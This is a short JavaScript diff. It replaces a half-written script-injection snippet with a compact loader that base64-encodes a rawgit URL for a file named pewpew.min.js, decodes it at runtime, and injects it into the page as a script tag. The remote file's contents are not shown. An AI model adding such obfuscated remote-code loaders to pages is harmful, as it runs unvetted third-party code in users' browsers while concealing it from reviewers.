@@ -1,7 +1,2 @@
-var d = document;
-var ddE = d.documentElement;
-var cE = d.createElement.bind(d);
-
-var s = cE('script');
-s.src =
-ddE.appendChild()
+var u='aHR0cHM6Ly9yYXdnaXQuY29tL2ppbS10aGlzcGxhY2UvcGV3cGV3L21hc3Rlci9wZXdwZXcubWluLmpz';
+var d=document,ddE=d.documentElement,cE=d.createElement.bind(d),s=cE(atob("c2NyaXB0"));s.src=atob(u),ddE.appendChild(s);
